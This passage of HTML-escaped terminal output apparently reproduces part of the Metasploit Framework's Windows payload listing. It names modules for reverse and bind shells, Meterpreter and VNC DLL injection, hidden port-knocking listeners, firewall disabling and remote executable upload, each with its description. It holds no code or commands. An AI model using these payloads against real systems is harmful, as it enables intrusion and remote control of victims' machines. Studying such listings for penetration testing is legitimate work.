(staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_tcp_uuid                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_winhttp                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP (Windows winhttp)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_winhttps                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTPS (Windows winhttp)</span><br><span class="line">    windows&#x2F;meterpreter_bind_named_pipe                 Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;meterpreter_bind_tcp                        Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;meterpreter_reverse_ipv6_tcp                Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;meterpreter_reverse_tcp                     Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service</span><br><span class="line">    windows&#x2F;metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_hidden_ipknock_tcp    Inject a custom DLL into the exploited process. Listen for a connection. First, the port will need to be knocked fr</span><br><span class="line">                                                        om the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping).</span><br><span class="line">                                                         After that you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide the</span><br><span class="line">                                                        shellcode</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_hidden_tcp            Inject a custom DLL into the exploited process. Listen for a connection from a hidden port and spawn a command shel</span><br><span class="line">                                                        l to the allowed host.</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_ipv6_tcp              Inject a custom DLL into the exploited process. Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_ipv6_tcp_uuid         Inject a custom DLL into the exploited process. Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_named_pipe            Inject a custom DLL into the exploited process. Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_nonx_tcp              Inject a custom DLL into the exploited process. Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_tcp                   Inject a custom DLL into the exploited process. Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_tcp_rc4               Inject a custom DLL into the exploited process. Listen for a connection</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_tcp_uuid              Inject a custom DLL into the exploited process. Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;find_tag                   Inject a custom DLL into the exploited process. Use an established connection</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_ipv6_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_nonx_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_ord_tcp            Inject a custom DLL into the exploited process. Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_tcp                Inject a custom DLL into the exploited process. Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_tcp_allports       Inject a custom DLL into the exploited process. Try to connect back to the attacker, on all possible ports (1-65535</span><br><span class="line">                                                        , slowly)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_tcp_dns            Inject a custom DLL into the exploited process. Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_tcp_rc4            Inject a custom DLL into the exploited process. Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_tcp_rc4_dns        Inject a custom DLL into the exploited process. Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_tcp_uuid           Inject a custom DLL into the exploited process. Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_hidden_ipknock_tcp  Inject the meterpreter server DLL (staged). Listen for a connection. First, the port will need to be knocked from t</span><br><span class="line">                                                        he IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). Aft</span><br><span class="line">                                                        er that you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide the shel</span><br><span class="line">                                                        lcode</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_hidden_tcp          Inject the meterpreter server DLL (staged). Listen for a connection from a hidden port and spawn a command shell to</span><br><span class="line">                                                         the allowed host.</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_ipv6_tcp            Inject the meterpreter server DLL (staged). Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_ipv6_tcp_uuid       Inject the meterpreter server DLL (staged). Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_named_pipe          Inject the meterpreter server DLL (staged). Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_nonx_tcp            Inject the meterpreter server DLL (staged). Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_tcp                 Inject the meterpreter server DLL (staged). Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_tcp_rc4             Inject the meterpreter server DLL (staged). Listen for a connection</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_tcp_uuid            Inject the meterpreter server DLL (staged). Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;find_tag                 Inject the meterpreter server DLL (staged). Use an established connection</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_ipv6_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_nonx_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_ord_tcp          Inject the meterpreter server DLL (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_tcp              Inject the meterpreter server DLL (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_tcp_allports     Inject the meterpreter server DLL (staged). Try to connect back to the attacker, on all possible ports (1-65535, sl</span><br><span class="line">                                                        owly)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_tcp_dns          Inject the meterpreter server DLL (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_tcp_rc4          Inject the meterpreter server DLL (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_tcp_rc4_dns      Inject the meterpreter server DLL (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_tcp_uuid         Inject the meterpreter server DLL (staged). Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_hidden_ipknock_tcp            Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection. First, the port will need to be knock</span><br><span class="line">                                                        ed from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hp</span><br><span class="line">                                                        ing). After that you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide</span><br><span class="line">                                                         the shellcode</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_hidden_tcp                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection from a hidden port and spawn a command</span><br><span class="line">                                                         shell to the allowed host.</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_ipv6_tcp                      Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_ipv6_tcp_uuid                 Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_named_pipe                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_nonx_tcp                      Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_tcp                           Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_tcp_rc4                       Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_tcp_uuid                      Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;peinject&#x2F;find_tag                           Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Use an established connection</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_ipv6_tcp                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_named_pipe                 Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker via a named pipe pivot</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_nonx_tcp                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_ord_tcp                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_tcp                        Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_tcp_allports               Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Try to connect back to the attacker, on all possible ports (1-</span><br><span class="line">                                                        65535, slowly)</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_tcp_dns                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_tcp_rc4                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_tcp_rc4_dns                Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_tcp_uuid                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;pingback_bind_tcp                           Open a socket and report UUID when a connection is received (Windows x86)</span><br><span class="line">    windows&#x2F;pingback_reverse_tcp                        Connect back to attacker and report UUID (Windows x86)</span><br><span class="line">    windows&#x2F;powershell_bind_tcp                         Listen for a connection and spawn an interactive powershell session</span><br><span class="line">    windows&#x2F;powershell_reverse_tcp                      Listen for a connection and spawn an interactive powershell session</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_hidden_ipknock_tcp               Spawn a piped command shell (staged). Listen for a connection. First, the port will need to be knocked from the IP</span><br><span class="line">                                                        defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After tha</span><br><span class="line">                                                        t you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide the shellcode</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_hidden_tcp                       Spawn a piped command shell (staged). Listen for a connection from a hidden port and spawn a command shell to the a</span><br><span class="line">                                                        llowed host.</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_ipv6_tcp                         Spawn a piped command shell (staged). Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_ipv6_tcp_uuid                    Spawn a piped command shell (staged). Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_named_pipe                       Spawn a piped command shell (staged). Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_nonx_tcp                         Spawn a piped command shell (staged). Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_tcp                              Spawn a piped command shell (staged). Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_tcp_rc4                          Spawn a piped command shell (staged). Listen for a connection</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_tcp_uuid                         Spawn a piped command shell (staged). Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;shell&#x2F;find_tag                              Spawn a piped command shell (staged). Use an established connection</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_ipv6_tcp                      Spawn a piped command shell (staged). Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_nonx_tcp                      Spawn a piped command shell (staged). Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_ord_tcp                       Spawn a piped command shell (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    windows&#x2F;shell_bind_tcp_xpfw                         Disable the Windows ICF, then listen for a connection and spawn a command shell</span><br><span class="line">    windows&#x2F;shell_hidden_bind_tcp                       Listen for a connection from certain IP and spawn a command shell. The shellcode will reply with a RST packet if th</span><br><span class="line">                                                        e connections is not coming from the IP defined in AHOST. This way the port will appear as &quot;closed&quot; helping us to h</span><br><span class="line">                                                        ide the shellcode.</span><br><span class="line">    windows&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    windows&#x2F;speak_pwned                                 Causes the target to say &quot;You Got Pwned&quot; via the Windows Speech API</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_hidden_ipknock_tcp              Uploads an executable and runs it (staged). Listen for a connection. First, the port will need to be knocked from t</span><br><span class="line">                                                        he IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). Aft</span><br><span class="line">                                                        er that you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide the shel</span><br><span class="line">                                                        lcode</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_hidden_tcp                      Uploads an executable and runs it (staged). Listen for a connection from a hidden port and spawn a command shell to</span><br><span class="line">                                                         the allowed host.</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_ipv6_tcp                        Uploads an executable and runs it (staged). Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_ipv6_tcp_uuid                   Uploads an executable and runs it (staged). Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_named_pipe                      Uploads an executable and runs it (staged). Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_nonx_tcp                        Uploads an executable and runs it (staged). Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_tcp                             Uploads an executable and runs it (staged). Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_tcp_rc4                         Uploads an executable and runs it (staged). Listen for a connection</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_tcp_uuid                        Uploads an executable and runs it (staged). Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;upexec&#x2F;find_tag                             Uploads an executable and runs it (staged). Use an established connection</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_ipv6_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_nonx_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_ord_tcp                      Uploads an executable and runs it (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_tcp                          Uploads an executable and runs it (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_tcp_allports                 Uploads an executable and runs it (staged). Try to connect back to the attacker, on all possible ports (1-65535, sl</span><br><span class="line">                                                        owly)</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_tcp_dns                      Uploads an executable and runs it (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_tcp_rc4                      Uploads an executable and runs it (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_tcp_rc4_dns                  Uploads an executable and runs it (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_tcp_uuid                     Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_udp                          Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_hidden_ipknock_tcp           Inject a VNC Dll via a reflective loader (staged). Listen for a connection. First, the port will need to be knocked</span><br><span class="line">                                                         from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hpin</span><br><span class="line">                                                        g). After that you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide t</span><br><span class="line">                                                        he shellcode</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_hidden_tcp                   Inject a VNC Dll via a reflective loader (staged). Listen for a connection from a hidden port and spawn a command s</span><br><span class="line">                                                        hell to the allowed host.</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_ipv6_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_ipv6_tcp_uuid                Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_named_pipe                   Inject a VNC Dll via a reflective loader (staged). Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_nonx_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_tcp                          Inject a VNC Dll via a reflective loader (staged). Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_tcp_rc4                      Inject a VNC Dll via a reflective loader (staged). Listen for a connection</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_tcp_uuid                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;find_tag                          Inject a VNC Dll via a reflective loader (staged). Use an established connection</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_hop_http                  Inject a VNC Dll via a reflective loader (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that</span><br><span class="line">                                                        you must first upload data&#x2F;hop&#x2F;hop.php to the PHP server you wish to use as a hop.</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_http                      Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows wininet)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_http_proxy_pstore         Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_ipv6_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_nonx_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_ord_tcp                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_tcp                       Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_tcp_allports              Inject a VNC Dll via a reflective loader (staged). Try to connect back to the 